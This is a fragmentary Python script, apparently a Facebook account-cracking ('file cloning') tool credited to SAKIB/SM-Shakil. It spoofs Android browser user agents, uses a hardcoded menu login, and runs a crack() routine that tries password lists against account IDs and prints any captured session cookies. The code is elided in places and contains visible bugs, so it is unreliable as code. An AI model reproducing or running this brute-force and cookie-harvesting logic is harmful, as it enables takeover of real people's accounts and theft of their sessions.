...
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J730F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-M205FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.217 Mobile Safari/537.36",]
ugen2=[]
ugen=[]
cokbrut=[]
...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mSAKIB')
...
NameX =input('YOUR NAME : ')
print('==================')

import getpass

attemps = 0
os.system('espeak -a 300 " Your, Username, "')
while attemps < 12345677901:
    username = input('\33[0;92mEnter Username: ')
    print('==================')
    os.system('espeak -a 300 " Your, Password, "')
    password = input('\33[0;93mEnter Password: ')

    if username == 'S' and password == 'M':
        break
    else:
        print(' Incorrect Pass Please Trying ')
        attemps += 1
        continue
os.system('espeak -a 300 " Log in,  Successfully,Bro, "')
print(' \33[0;92mYou Have Successfully Logged in.')
os.system('clear')
	
os.system('espeak -a 300 " Welcome, to, sakib,  file, cloning,  Tools"')
os.system('')
def banner():
	os.system("clear")
	print (f"""
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                • \33[1;38mSM-Shakil \33[1;38m        ║\033[1;31m 
╠══[Facebook              • MD Sakib khan     ║  \033[1;97m  
╠══[Whatsapp              • 01320330198       ║\33[1;35m 
╠══[TOOLS                 • S+M               ║ \33[1;32m   
╠══[VERSION               • 4.0               ║\033[1;35m 
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m""")
def login():
	banner()
	os.system('espeak -a 300 " update mathod,   one,   file cloning,"')
	SAKIBj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	SAKIBj('\033[0;97m===============================================')
	SAKIB= input('\x1b[1;92m[+] CHOOSE : ');time.sleep(0.01)
	if SAKIB in ['m']:
		public()
	elif SAKIB in ['1']:
		crack_file()
		...
		os.system('xdg-open https://wa.me/+8801308816476')
	elif SAKIB in ['0']:
...
def passwrd():
	...
	print(f'\r\033[0;94m[\033[92;1m+\033[97;1m] \033[0;92mSTARTDE YOUR CLONING TIME : {time.strftime("%H:%M")} ')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[SAKIB-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•Cp] {idf} • {pw}')
				print('\033[0;94m===============================================')
				...
				print(coki=po.cookies.get_dict())
				koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m===============================================')
